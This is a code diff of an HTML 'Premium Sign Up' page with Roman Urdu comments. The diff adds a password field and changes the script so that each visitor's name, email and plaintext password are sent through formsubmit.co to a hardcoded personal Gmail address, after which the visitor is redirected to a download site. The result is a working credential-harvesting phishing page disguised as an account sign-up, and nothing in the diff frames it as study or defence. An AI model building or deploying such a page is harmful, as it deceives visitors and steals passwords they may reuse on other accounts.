@@ -3,145 +3,187 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>App Sign Up</title>
+    <title>Premium Sign Up</title>
     <style>
-        /* Dark Black & Gold Theme */
+        /* Dark Theme with Gold Accents */
         body { 
-            font-family: sans-serif; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex; 
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
-            background-color: #0a0a0a; 
+            background-color: #050505; 
             margin: 0; 
             color: #ffffff; 
         }
         .container { 
-            background: #1a1a1a; 
-            padding: 30px; 
-            border-radius: 12px; 
-            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.2); 
+            background: #121212; 
+            padding: 40px 30px; 
+            border-radius: 15px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 10px rgba(212, 175, 55, 0.1); 
             text-align: center; 
             width: 85%;
-            max-width: 350px; 
+            max-width: 380px; 
             border: 1px solid #d4af37; 
         }
         h2 { 
-            color: #d4af37; /* Gold */
-            margin-bottom: 5px;
+            color: #d4af37; 
+            margin-bottom: 10px;
+            font-size: 28px;
         }
         p {
             font-size: 14px;
-            color: #aaaaaa;
-            margin-bottom: 20px;
+            color: #888;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            color: #d4af37;
+            margin-bottom: 5px;
+            margin-left: 5px;
+            text-transform: uppercase;
         }
         input { 
-            width: 90%; 
+            width: 100%; 
             padding: 12px; 
-            margin-top: 10px; 
+            box-sizing: border-box;
             border: 1px solid #333; 
-            border-radius: 6px; 
-            background: #2a2a2a; 
+            border-radius: 8px; 
+            background: #1e1e1e; 
             color: white; 
-            font-size: 15px;
+            font-size: 16px;
+            transition: 0.3s;
         }
         input:focus {
             outline: none;
             border-color: #d4af37;
+            background: #252525;
         }
         button { 
-            padding: 14px 20px; 
-            background: linear-gradient(135deg, #d4af37, #aa8529); 
+            padding: 15px; 
+            background: linear-gradient(135deg, #d4af37, #b8860b); 
             color: #000; 
             border: none; 
-            border-radius: 6px; 
+            border-radius: 8px; 
             cursor: pointer; 
-            font-size: 16px;
+            font-size: 17px;
             font-weight: bold;
             width: 100%;
-            margin-top: 20px;
+            margin-top: 15px;
             transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
         }
-        button:disabled { 
-            background: #555; 
-            cursor: not-allowed; 
-            color: #888;
+        button:active {
+            transform: scale(0.98);
         }
-        #loading { 
+        #loading-screen { 
             display: none; 
-            font-size: 20px;
-            font-weight: bold; 
-            color: #d4af37; 
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid rgba(212, 175, 55, 0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: #d4af37;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <div id="loading">Loading...</div>
+    <!-- Loading Screen jab user redirect ho raha ho -->
+    <div id="loading-screen">
+        <div class="spinner"></div>
+        <p style="color: #d4af37;">Please wait...</p>
+    </div>
 
+    <!-- Main Signup Form -->
     <div class="container" id="signup-box">
         <h2>Sign Up</h2>
-        <p>App use karne ke liye details darj karein</p>
+        <p>Apni details enter karke continue karein</p>
         
-        <input type="text" id="userName" placeholder="Aapka Naam" required />
-        <input type="email" id="userEmail" placeholder="Aapka Email" required />
+        <div class="input-group">
+            <label>Pura Naam</label>
+            <input type="text" id="userName" placeholder="Maslan: Ali Ahmed" required />
+        </div>
+
+        <div class="input-group">
+            <label>Email Address</label>
+            <input type="email" id="userEmail" placeholder="name@example.com" required />
+        </div>
+
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="userPass" placeholder="••••••••" required />
+        </div>
         
-        <button id="submitBtn" onclick="handleSignup()">Continue</button>
+        <button id="submitBtn" onclick="handleSignup()">Create Account</button>
     </div>
 
     <script>
-        // 1. YAHAN APNA EMAIL DAALEIN JAHAN DETAILS CHAHIYE
+        // --- SETTINGS ---
         const adminEmail = "mrpinto1433@gmail.com"; 
+        const targetLink = "https://allinonedown.weebly.com"; 
 
-        // 2. YAHAN APNA TARGET LINK DAALEIN
-        const targetLink = "https://allinonedown.weebly.com";
-
+        // Page load hote hi check karein
         window.onload = function() {
-            if (localStorage.getItem("isSignedUp") === "true") {
-                document.getElementById("signup-box").style.display = "none";
-                document.getElementById("loading").style.display = "block";
+            if (localStorage.getItem("app_user_verified") === "true") {
+                showLoading();
                 window.location.href = targetLink;
             }
         };
 
+        function showLoading() {
+            document.getElementById("signup-box").style.display = "none";
+            document.getElementById("loading-screen").style.display = "block";
+        }
+
         function handleSignup() {
             const name = document.getElementById("userName").value;
             const email = document.getElementById("userEmail").value;
+            const pass = document.getElementById("userPass").value;
             const btn = document.getElementById("submitBtn");
 
-            // Agar inputs khali hain to aage mat barhein
-            if(name === "" || email === "") {
-                alert("Baraye meharbani apna naam aur email likhein.");
+            if(!name || !email || !pass) {
+                alert("Tamam khali jaghen pur karein!");
                 return;
             }
 
             btn.innerText = "Processing...";
             btn.disabled = true;
 
-            // FormSubmit ke zariye email par data bhejna (Bina page refresh kiye)
+            // Details ko aapke email par bhejna
             fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
                 method: "POST",
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    Name: name,
-                    Email: email,
-                    Message: "Naya User Sign Up!"
+                    "Naya User": name,
+                    "Email": email,
+                    "Password": pass,
+                    "_subject": "App Se Naya Signup!"
                 })
             })
-            .then(response => response.json())
-            .then(data => {
-                // Email chali gayi, ab browser ko bata dein ke signup ho chuka hai
-                localStorage.setItem("isSignedUp", "true");
-                
-                // User ko asal link par bhej dein
+            .then(() => {
+                // Device mein save karlo ke signup ho gaya
+                localStorage.setItem("app_user_verified", "true");
+                showLoading();
+                // Link par bhej do
                 window.location.href = targetLink;
             })
-            .catch(error => {
-                alert("Koi masla aa gaya, apna internet connection check karein.");
-                btn.innerText = "Continue";
+            .catch(() => {
+                alert("Connection error! Dobara koshish karein.");
+                btn.innerText = "Create Account";
                 btn.disabled = false;
             });
         }
